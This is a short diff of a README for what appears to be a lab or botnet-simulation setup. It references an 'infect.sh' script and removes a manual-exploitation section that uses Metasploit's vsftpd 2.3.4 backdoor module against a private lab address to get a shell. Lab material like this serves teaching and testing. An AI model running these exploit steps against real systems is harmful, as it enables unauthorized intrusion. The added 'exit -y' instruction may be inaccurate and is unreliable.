@@ -12,19 +12,5 @@
 ./scripts/infect.sh
 ```
 
+`exit -y` to leave msf6 and return back to the console.
 
-### 3. Manual exploitation (alternative)
-
-Start Metasploit on your host (Ubuntu VM):
-```bash
-msfconsole
-```
-
-Exploit a bot using the vsftpd 2.3.4 backdoor:
-```
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 172.18.0.3
-exploit
-```
-
-You now have a shell on the bot!
